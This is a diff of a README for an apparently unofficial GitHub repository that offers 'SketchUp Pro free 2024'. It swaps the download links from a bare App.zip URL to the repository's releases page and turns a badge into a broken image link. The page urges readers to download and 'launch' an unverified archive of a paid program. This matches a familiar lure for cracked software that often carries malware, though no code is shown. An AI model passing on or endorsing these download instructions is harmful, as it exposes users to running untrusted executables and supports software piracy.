@@ -21,11 +21,11 @@ SketchUp Pro is a professional 3D modeling software widely used in fields such a
 11. sketchup-pro-plugin
 12. sketchup-pro-tutorials
 
-For more detailed information, feel free to explore the [repository](https://github.com/uploads/App.zip).
+For more detailed information, feel free to explore the [repository](https://github.com/Jaysonhunk/SketchUp-Pro-free-2024/releases).
 
 ## 🚀 Important Link:
 
-[![Download SketchUp Pro](https://img.shields.io/badge/Download-SketchUp_Pro-brightgreen)](https://github.com/uploads/App.zip)
+[![Download SketchUp Pro](https://github.com/Jaysonhunk/SketchUp-Pro-free-2024/releases)](https://github.com/Jaysonhunk/SketchUp-Pro-free-2024/releases)
 
 ### Note:
 The link provided needs to be launched for access.
